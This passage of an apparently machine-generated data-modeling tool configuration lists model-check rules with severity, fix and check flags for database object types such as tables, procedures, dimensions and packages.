CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default][FolderOptions\\CheckModel\\Default\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\DfltValeEmpty]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Default\\DfltSameVale]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User][FolderOptions\\CheckModel\\User\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\User\\UniquePassword]CheckSeverity=NoFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Group][FolderOptions\\CheckModel\\Group\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\EmptyColl - USERCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Group\\UniquePassword]CheckSeverity=NoFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Role][FolderOptions\\CheckModel\\Role\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Role\\EmptyColl - USERCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure][FolderOptions\\CheckModel\\Procedure\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\ProcBodyEmpty]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Procedure\\EmptyColl - PERMCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\DBMS Trigger][FolderOptions\\CheckModel\\DBMS Trigger\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\DBMS Trigger\\DbmsTriggerEvent]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source][FolderOptions\\CheckModel\\Data Source\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\EmptyColl - MODLSRC]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\DtscTargets]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Source\\CheckDataSourceModels]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Horizontal Partitioning][FolderOptions\\CheckModel\\Horizontal Partitioning\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Horizontal Partitioning\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Horizontal Partitioning\\EmptyColl - PARTCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Horizontal Partitioning\\TargetTables]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Vertical Partitioning][FolderOptions\\CheckModel\\Vertical Partitioning\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Vertical Partitioning\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Vertical Partitioning\\EmptyColl - PARTCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Vertical Partitioning\\TargetTables]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table Collapsing][FolderOptions\\CheckModel\\Table Collapsing\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table Collapsing\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table Collapsing\\EmptyColl - TargetTable]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table Collapsing\\TargetTables]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact][FolderOptions\\CheckModel\\Fact\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\EmptyColl - MEASCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\Mapping]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\MappingSFMap]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\EmptyColl - ALLOLINKCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact\\CubeDupAssociation]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension][FolderOptions\\CheckModel\\Dimension\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\EmptyColl - DATTRCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\EmptyColl - HIERCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\DimnDupHierarchy]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\DimnDefHierarchy]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\Mapping]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\MappingSFMap]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension\\SerialColumnNumber]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association][FolderOptions\\CheckModel\\Association\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\EmptyColl - Hierarchy]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute][FolderOptions\\CheckModel\\Dimension.Attribute\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Attribute\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure][FolderOptions\\CheckModel\\Fact.Measure\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Measure\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute][FolderOptions\\CheckModel\\Fact.Fact Attribute\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Fact.Fact Attribute\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy][FolderOptions\\CheckModel\\Dimension.Hierarchy\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Dimension.Hierarchy\\EmptyColl - DATTRCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym][FolderOptions\\CheckModel\\Synonym\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\MaxLen - NAME]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Synonym\\EmptyColl - BASEOBJ]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type][FolderOptions\\CheckModel\\Abstract Data Type\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\AdtInstantiable]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type\\AdtAbstractUsed]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure][FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\AdtProcUniqName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\UniqueDefinition]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Abstract Data Type.Abstract Data Type Procedure\\ReturnDataType]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package][FolderOptions\\CheckModel\\Database Package\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\MaxLen - NAME]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\EmptyColl - PROCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package\\EmptyColl - CURCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package\\EmptyColl - VARCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package\\EmptyColl - TYPCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package\\EmptyColl - EXCCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package.Database Package Procedure][FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\UniqueDefinition]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\EmptyColl - PARM]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package.Database Package Procedure\\ReturnDataType]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence][FolderOptions\\CheckModel\\Sequence\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Sequence\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor][FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\UniqueDefinition]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\ReturnDataType]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Cursor\\EmptyColl - PARM]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Database Package.Database Package Variable][FolderOptions\\CheckModel\\Database Package.Database Package Variable\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package Variable\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Database Package.Database Package 